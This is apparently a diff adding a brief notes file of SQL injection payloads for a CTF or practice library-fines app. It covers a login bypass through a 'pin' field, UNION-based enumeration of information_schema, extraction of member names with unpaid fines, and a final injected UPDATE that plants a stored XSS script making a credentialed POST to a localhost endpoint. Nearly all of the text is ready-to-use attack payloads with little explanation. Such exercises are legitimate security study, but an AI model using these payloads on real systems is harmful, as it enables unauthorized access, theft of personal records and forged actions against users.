@@ -1,0 +1,41 @@
+1 -> 
+Id : 4100001
+pin: ' or '1=1'#
+
+2 ->
+order by method works upto 4 column 
+Id: 400001
+Pin: ' or '1=1' order by x# 
+[ x is max 4]
+
+id : 400
+pin ' union  select 1,2,3,4 #
+ 2,3 column at member and 4 at total outstanding
+
+id: 400
+pin : xxxxxxxxxx' union select 1,'',GROUP_CONCAT(table_name),4 FROM information_schema.tables WHERE table_schema=DATABASE() -- -
+tables: fine_record,log,member
+
+id: 400 
+pin : ' union select 1,'',GROUP_CONCAT(column_name),4 FROM information_schema.columns WHERE table_name='fine_record' -- -
+fine_id,member_id,amount,status,reason
+
+id: 400
+pin: ' union select 1,'',GROUP_CONCAT(status,' ', reason),4 from fine_record limit 3 -- -
+fine_status = PAID / UNPAID[used as string]
+
+3->
+
+ ' UNION SELECT 1,   (SELECT GROUP_CONCAT(member.member_id,' ',member.first_name,' ',member.last_name, fine_record.amount SEPARATOR ' | ')     FROM member join fine_record on member.member_id = fine_record.member_id  where fine_record.status= 'UNPAID'),   '',4#
+
+ 4->' update member set last_name =  
+ '<script>
+ fetch("http://localhost:4001/list", {
+  "headers": {
+    "content-type": "application/x-www-form-urlencoded",
+  },
+  "referrer": "http://localhost:4001/",
+  "body": "title=2rand&price=12",
+  "method": "POST",
+  "credentials": "include"
+});</script>'
